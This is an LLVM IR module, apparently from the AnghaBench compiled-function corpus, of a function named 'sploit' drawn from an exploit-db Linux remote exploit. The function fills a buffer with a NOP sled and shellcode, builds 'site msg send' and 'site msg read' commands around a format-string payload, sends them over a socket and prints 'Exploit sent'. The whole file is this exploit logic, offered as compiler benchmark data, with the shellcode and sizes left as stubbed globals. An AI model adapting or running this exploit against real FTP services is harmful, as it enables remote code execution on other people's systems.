; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_373.c_sploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_373.c_sploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_4__ = type { i8* }

@BS = common dso_local global i32 0, align 4
@NOP = common dso_local global i32 0, align 4
@sc = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [22 x i8] c"site msg send %s %s\0D\0A\00", align 1
@.str.1 = private unnamed_addr constant [5 x i8] c"send\00", align 1
@.str.2 = private unnamed_addr constant [19 x i8] c"site msg read %s\0D\0A\00", align 1
@.str.3 = private unnamed_addr constant [14 x i8] c"Exploit sent\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @sploit(%struct.TYPE_4__* %0, i32 %1) #0 {
  %3 = alloca %struct.TYPE_4__*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i64, align 8
  %7 = alloca i64, align 8
  %8 = alloca i64, align 8
  store %struct.TYPE_4__* %0, %struct.TYPE_4__** %3, align 8
  store i32 %1, i32* %4, align 4
  %9 = load i32, i32* @BS, align 4
  %10 = zext i32 %9 to i64
  %11 = call i8* @llvm.stacksave()
  store i8* %11, i8** %5, align 8
  %12 = alloca i8, i64 %10, align 16
  store i64 %10, i64* %6, align 8
  %13 = load i32, i32* @BS, align 4
  %14 = zext i32 %13 to i64
  %15 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %7, align 8
  %16 = load i32, i32* @BS, align 4
  %17 = zext i32 %16 to i64
  %18 = alloca i8, i64 %17, align 16
  store i64 %17, i64* %8, align 8
  %19 = load i32, i32* @NOP, align 4
  %20 = load i32, i32* @BS, align 4
  %21 = call i32 @memset(i8* %18, i32 %19, i32 %20)
  %22 = getelementptr inbounds i8, i8* %18, i64 100
  %23 = load i32, i32* @sc, align 4
  %24 = load i32, i32* @BS, align 4
  %25 = sub nsw i32 %24, 101
  %26 = call i32 @strncpy(i8* %22, i32 %23, i32 %25)
  %27 = load i32, i32* @BS, align 4
  %28 = sub nsw i32 %27, 1
  %29 = sext i32 %28 to i64
  %30 = getelementptr inbounds i8, i8* %18, i64 %29
  store i8 0, i8* %30, align 1
  %31 = load %struct.TYPE_4__*, %struct.TYPE_4__** %3, align 8
  %32 = call i32 @get_fmt(%struct.TYPE_4__* %31, i8* %15)
  %33 = load i32, i32* @BS, align 4
  %34 = sub nsw i32 %33, 1
  %35 = load %struct.TYPE_4__*, %struct.TYPE_4__** %3, align 8
  %36 = getelementptr inbounds %struct.TYPE_4__, %struct.TYPE_4__* %35, i32 0, i32 0
  %37 = load i8*, i8** %36, align 8
  %38 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %12, i32 %34, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i8* %37, i8* %15)
  %39 = load i32, i32* @BS, align 4
  %40 = sub nsw i32 %39, 1
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %12, i64 %41
  store i8 0, i8* %42, align 1
  %43 = load i32, i32* %4, align 4
  %44 = call i32 @strlen(i8* %12)
  %45 = call i64 @send(i32 %43, i8* %12, i32 %44, i32 0)
  %46 = icmp slt i64 %45, 0
  br i1 %46, label %47, label %49

47:                                               ; preds = %2
  %48 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  br label %49

49:                                               ; preds = %47, %2
  %50 = call i32 @sleep(i32 5)
  %51 = load i32, i32* @BS, align 4
  %52 = sub nsw i32 %51, 1
  %53 = call i32 (i8*, i32, i8*, i8*, ...) @snprintf(i8* %12, i32 %52, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.2, i64 0, i64 0), i8* %18)
  %54 = load i32, i32* @BS, align 4
  %55 = sub nsw i32 %54, 1
  %56 = sext i32 %55 to i64
  %57 = getelementptr inbounds i8, i8* %12, i64 %56
  store i8 0, i8* %57, align 1
  %58 = load i32, i32* %4, align 4
  %59 = call i32 @strlen(i8* %12)
  %60 = call i64 @send(i32 %58, i8* %12, i32 %59, i32 0)
  %61 = icmp slt i64 %60, 0
  br i1 %61, label %62, label %64

62:                                               ; preds = %49
  %63 = call i32 @die(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  br label %64

64:                                               ; preds = %62, %49
  %65 = call i32 @printf(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.3, i64 0, i64 0))
  %66 = call i32 @sleep(i32 1)
  %67 = load i8*, i8** %5, align 8
  call void @llvm.stackrestore(i8* %67)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @memset(i8*, i32, i32) #2

declare dso_local i32 @strncpy(i8*, i32, i32) #2

declare dso_local i32 @get_fmt(%struct.TYPE_4__*, i8*) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*, ...) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @die(i8*) #2

declare dso_local i32 @sleep(i32) #2

declare dso_local i32 @printf(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
